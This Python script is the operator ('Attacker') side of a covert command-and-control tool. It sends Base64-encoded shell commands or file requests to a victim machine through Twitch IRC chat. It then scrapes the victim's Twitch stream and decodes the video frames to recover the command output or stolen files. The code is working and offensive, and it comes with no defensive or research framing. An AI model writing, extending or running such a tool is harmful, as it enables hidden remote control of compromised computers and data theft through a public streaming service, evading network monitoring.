#!/usr/bin/env python3
import argparse
import base64
import hashlib
import os
import re
import subprocess
import time
import uuid

from twitch_chat_irc import TwitchChatIRC  # provided IRC module

# --- Constants ---
OK_TIMEOUT = 30       # seconds to wait for "OK"
READY_TIMEOUT = 60    # seconds to wait for "READY"
CRAWLER_SCRIPT = "crawler.py"
DECODER_SCRIPT = "decoder.py"
RETRY_DELAY = 1       # seconds to wait before retrying crawler

def generate_short_id():
    """Generate an 8-character hex string (using UUID4)."""
    return uuid.uuid4().hex[:8]

def send_command(chat, channel, command_text):
    """
    Prepend a short unique ID to the command, Base64‑encode it,
    and send it via chat.
    """
    uid = generate_short_id()
    payload = f"{uid}:{command_text}"
    b64_payload = base64.b64encode(payload.encode()).decode()
    chat.send(channel, b64_payload)
    print(f"[Attacker] Sent command with ID: {uid}")
    return uid

def wait_for_response(chat, channel, expected_message, timeout):
    """Poll the channel until a message exactly matching expected_message is received."""
    start = time.time()
    while time.time() - start < timeout:
        messages = chat.listen(channel, timeout=5, message_limit=1)
        for msg in messages:
            text = msg.get("message", "").strip()
            if text == expected_message:
                print(f"[Attacker] Received expected response: {text}")
                return True
        time.sleep(1)
    print(f"[Attacker] Timeout waiting for '{expected_message}'.")
    return False

def capture_stream(uid, channel):
    """
    Invoke the crawler to capture the victim’s stream.
    This routine now retries the crawler until a valid stream link is detected.
    After success, it removes duplicate PNG frames (via SHA‑256)
    and runs the decoder to reconstruct the delivered file.
    Returns the file name reconstructed by the decoder.
    """
    # Prepare an output pattern that includes the unique ID.
    # //TODO: "%04d" means 10k frames, might have to edit for larger files. 
  
    output_pattern = f"{uid}-%04d.png"
    channel = f"https://twitch.tv/{channel}"
    crawler_cmd = ["python", CRAWLER_SCRIPT, "--channel", channel, "--output", output_pattern]
    
    print(f"[Attacker] Starting crawler with output pattern: {output_pattern}")
    while True:
        try:
            subprocess.run(crawler_cmd, check=True)
            break  # exit loop if crawler succeeds
        except subprocess.CalledProcessError as e:
            print(f"[Attacker] Crawler failed to get stream link, retrying in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)
    
    # Remove duplicate PNG frames.
    seen_hashes = set()
    png_files = sorted(f for f in os.listdir() if f.endswith(".png") and f.startswith(uid))
    for f in png_files:
        with open(f, "rb") as img:
            h = hashlib.sha256(img.read()).hexdigest()
        if h in seen_hashes:
            os.remove(f)
            print(f"[Attacker] Removed duplicate frame: {f}")
        else:
            seen_hashes.add(h)
    
    if not png_files:
        print("[Attacker] No PNG frames found for decoding.")
        return None

    # Run decoder.py with the list of PNG files.
    decoder_cmd = ["python", DECODER_SCRIPT] + png_files
    try:
        # Capture decoder's stdout.
        result = subprocess.check_output(decoder_cmd, stderr=subprocess.STDOUT)
        output = result.decode()
        print("[Attacker] Decoder output:")
        print(output)
        # Look for the line that says "Reconstructed data saved to <filename>"
        import re
        match = re.search(r"Reconstructed data saved to (.+)", output)
        if match:
            reconstructed_file = match.group(1).strip()
            print(f"[Attacker] Decoded file available as: {reconstructed_file}")
            return reconstructed_file
        else:
            print("[Attacker] Could not parse the reconstructed file name from decoder output.")
            return None
    except subprocess.CalledProcessError as e:
        print("[Attacker] Decoder failed:", e.output.decode())
        return None

def main():
    parser = argparse.ArgumentParser(
        description="Attacker: send commands over Twitch IRC and capture victim's stream"
    )
    parser.add_argument("--channel", required=True, help="Twitch channel name to watch")
    args = parser.parse_args()

    # Use default (anonymous) credentials from twitch_chat_irc.
    chat = TwitchChatIRC()  
    try:
        while True:
            user_input = input("Enter system command or file request (prefix file: to request file): ").strip()
            if not user_input:
                break

            uid = send_command(chat, args.channel, user_input)
            
            # Wait for "OK" message (ignore errors).
            if not wait_for_response(chat, args.channel, "OK", OK_TIMEOUT):
                print("[Attacker] Proceeding despite missing OK.")
            else:
                # Once OK is received, wait for "READY".
                if not wait_for_response(chat, args.channel, "READY", READY_TIMEOUT):
                    print("[Attacker] Did not receive READY; skipping this round.")
                    continue
                # When READY arrives, reply with "OK".
                chat.send(args.channel, "OK")
                print("[Attacker] Sent OK after READY. Beginning stream capture.")
                
                # Capture and process the stream.
                result_file = capture_stream(uid, args.channel)
                if result_file:
                    if user_input.startswith("file:"):
                        print(f"[Attacker] Received file: {result_file}")
                    else:
                        print(f"[Attacker] Command output from {result_file}:")
                        with open(result_file, "r") as f:
                            print(f.read())
                else:
                    print("[Attacker] No file recovered from the stream.")
    except KeyboardInterrupt:
        print("\n[Attacker] Exiting.")
    finally:
        chat.close_connection()

if __name__ == "__main__":
    main()
